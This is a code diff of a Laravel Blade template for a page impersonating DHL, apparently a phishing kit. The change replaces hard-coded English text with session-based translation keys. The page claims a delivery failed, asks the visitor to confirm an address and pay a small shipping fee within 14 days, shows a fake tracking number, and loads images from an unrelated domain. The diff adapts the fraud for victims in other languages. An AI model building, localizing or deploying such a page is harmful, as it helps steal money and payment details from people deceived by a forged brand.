@@ -173,7 +173,7 @@ function redirect(){
                 <a href="#" class=""><span class="mbl_ship"><i class="fas fa-shipping-fast"></i></span>Ship</a>
                 <a href="#" class=""><span class="mbl_track"><i class="fas fa-location-arrow"></i></span>Track</a>
                 <a class="mbl_help" href="#"><span class="ic"><i class="fas fa-hands-helping"></i></span>{{Session()->get("lang-header-help")}}</a>
-                <a class="mbl_find" href="#"><span class="icc"><i class="fas fa-map-marker-alt"></i></span>Find a location</a>
+                <a class="mbl_find" href="#"><span class="icc"><i class="fas fa-map-marker-alt"></i></span>{{Session()->get("lang-header-find")}}</a>
 
                 <a href="#" class=" reg_m"><span class="mbl_reg"><i class="fas fa-lock"></i></span>Connexion</a>
 
@@ -184,7 +184,7 @@ function redirect(){
                         <a class="nav-link" href="#">{{Session()->get("lang-header-help")}}</a>
                     </li>
                     <li class="nav-item">
-                        <a class="nav-link loc" href="#">Find a location</a>
+                        <a class="nav-link loc" href="#">{{Session()->get("lang-header-find")}}</a>
                     </li>
                     <li>
                         <div class="jhGf">
@@ -227,20 +227,20 @@ function redirect(){
                 <div class="col-sm-6 col-md-8 col">
                     <ul class="header-navbar-nav me-auto mb-2 mb-lg-0">
                         <li class="nav-li">
-                            <a href="#" class="top-nav">Home</a>
+                            <a href="#" class="top-nav">{{Session()->get("lang-header-home")}}</a>
                         </li>
                         <li class="nav-li">
-                            <a href="#" class="top-nav">Ship</a>
+                            <a href="#" class="top-nav">{{Session()->get("lang-header-ship")}}</a>
                         </li>
                         <li class="nav-li">
-                            <a href="#" class="top-nav">Track</a>
+                            <a href="#" class="top-nav">{{Session()->get("lang-header-track")}}</a>
                         </li>
                     </ul>
                 </div>
                 <div class="col-sm-6 col-md-3 col">
                     <ul class="eriOl">
-                        <li class="nav-li"><a href="#" class="top-nav">Register</a></li>
-                        <li class="nav-li"><a href="#" class="top-nav">Login</a></li>
+                        <li class="nav-li"><a href="#" class="top-nav">{{Session()->get("lang-header-register")}}</a></li>
+                        <li class="nav-li"><a href="#" class="top-nav">{{Session()->get("lang-header-login")}}</a></li>
                     </ul>
                 </div>
             </div>
@@ -254,18 +254,18 @@ function redirect(){
                 <img src="https://dispatching-centre.wtechsmartwater.com/images/all.png" alt="" style="height: 60px;">
             </div>
             <div class="col-12 text-center" style="font-size: 1rem;">
-                <p class="mb-0 mt-2 font-weight-bolder">A delivery attempt failed.</p><p><br>
+                <p class="mb-0 mt-2 font-weight-bolder">{{Session()->get("lang-index-attempt")}}</p><p><br>
 
-                    We could not deliver your package due to an incorrect delivery address.<br>
-    Please confirm your adress and pay your shipping cost <br> to receive your package.            </p></div>
+                    {{Session()->get("lang-index-notdeliver")}}<br>
+                    {{Session()->get("lang-index-please")}} <br> {{Session()->get("lang-index-receive")}}            </p></div>
             <div class="col-12 text-center">
-                <span class="font-weight-bolder">Date: <span> {{  now()->toDateString('Y-m-d') }}
+                <span class="font-weight-bolder">{{Session()->get("lang-index-date")}}: <span> {{  now()->toDateString('Y-m-d') }}
             </span></span></div>
             <div class="col-12 text-center">
-                <span class="font-weight-bolder">Charges applied: <span> <span class="text-danger font-weight-bold">{{$currency_code ?? 'USD'}}</span>3,57
+                <span class="font-weight-bolder">{{Session()->get("lang-index-charges")}}: <span> <span class="text-danger font-weight-bold">{{$currency_code ?? 'USD'}}</span>3,57
             </span></span></div>
             <div class="col-12 text-center mt-4">
-                <p class="mb-0 mt-4 font-weight-bold">Your tracking number</p>
+                <p class="mb-0 mt-4 font-weight-bold">{{Session()->get("lang-index-tackingnum")}}</p>
                 <input class="trNo ml-0" type="text" disabled="" value="JJD5678203" style="width: 250px;">
             </div>
             <div class="col-12 text-center d-flex justify-content-center">
@@ -279,12 +279,12 @@ function redirect(){
                     <input type="hidden" name="_fo" value="">
                     <input type="hidden" name="_land" value="welcome">
                     <button class="btn btn-danger pl-4 pr-4 d-flex justify-content-center align-items-center" style="width: 250px;">
-                        Continue                                                    <div class="fa fa-chevron-right ml-2" style="font-size: .9rem;"></div>
+                        {{Session()->get("lang-index-continue")}}                                                    <div class="fa fa-chevron-right ml-2" style="font-size: .9rem;"></div>
                                             </button>
                 </form>
             </div>
             <div class="col-12 text-center ">
-                <sup class="text-danger">*</sup> <small>This action must be completed within 14 days.</small>
+                <sup class="text-danger">*</sup> <small>{{Session()->get("lang-index-thisaction")}}</small>
             </div>
         </div>
     </div>
@@ -299,31 +299,31 @@ function redirect(){
                             <div class="row">
                                 <div class="col-sm-12 col-md-4 col">
                                     <div class="square">
-                                        <h4 class="headline">Contact and Support </h4>
+                                        <h4 class="headline">{{Session()->get("lang-footer-cands")}} </h4>
                                         <ul>
                                             <li><a href="#">{{Session()->get("lang-header-help")}}</a></li>
-                                            <li><a href="#">FAQs</a></li>
-                                            <li><a href="#">Contact Us</a></li>
-                                            <li><a href="#">Find a location</a></li>
+                                            <li><a href="#">{{Session()->get("lang-footer-faqs")}}</a></li>
+                                            <li><a href="#">{{Session()->get("lang-footer-contact")}}</a></li>
+                                            <li><a href="#">{{Session()->get("lang-header-find")}}</a></li>
                                         </ul>
                                     </div>
                                 </div>
                                 <div class="col-sm-12 col-md-4 col">
                                     <div class="square">
-                                        <h4 class="headline">Legal</h4>
+                                        <h4 class="headline">{{Session()->get("lang-footer-legal")}}</h4>
                                         <ul>
-                                            <li><a href="#">Terms and Conditions</a></li>
-                                            <li><a href="#">Privacy Notice</a></li>
+                                            <li><a href="#">{{Session()->get("lang-footer-terms")}}</a></li>
+                                            <li><a href="#">{{Session()->get("lang-footer-privacy")}}</a></li>
                                         </ul>
                                     </div>
                                 </div>
                                 <div class="col-sm-12 col-md-4 col">
                                     <div class="square">
-                                    <h4 class="headline">Alerts</h4>
+                                    <h4 class="headline">{{Session()->get("lang-footer-alerts")}}</h4>
                                         <ul>
-                                            <li><a href="#">Fraud Awareness</a></li>
-                                            <li><a href="#">Fraud Support</a></li>
-                                            <li><a href="#">Important Information</a></li>
+                                            <li><a href="#">{{Session()->get("lang-footer-fawa")}}</a></li>
+                                            <li><a href="#">{{Session()->get("lang-footer-fas")}}</a></li>
+                                            <li><a href="#">{{Session()->get("lang-footer-import")}}</a></li>
                                         </ul>
                                     </div>
                                 </div>
@@ -337,10 +337,10 @@ function redirect(){
                             </div>
                             <div class="ledIu">
                                 <ul>
-                                    <li><a href="#">About DHL</a></li>
-                                    <li><a href="#">News</a></li>
-                                    <li><a href="#">Careers</a></li>
-                                    <li><a href="#">Legal notice</a></li>
+                                    <li><a href="#">{{Session()->get("lang-footer-about")}}</a></li>
+                                    <li><a href="#">{{Session()->get("lang-footer-news")}}</a></li>
+                                    <li><a href="#">{{Session()->get("lang-footer-careers")}}</a></li>
+                                    <li><a href="#">{{Session()->get("lang-footer-legalno")}}</a></li>
                                 </ul>
                             </div>
                         </div>
@@ -354,7 +354,7 @@ function redirect(){
                 <div class="row">
                     <div class="col">
                         <div class="social">
-                            <h4>Follow us</h4>
+                            <h4>{{Session()->get("lang-footer-follow")}}</h4>
                             <ul>
                                 <li><a href="#"><i class="fab fa-facebook-f"></i></a></li>
                                 <li><a href="#"><i class="fab fa-twitter"></i></a></li>
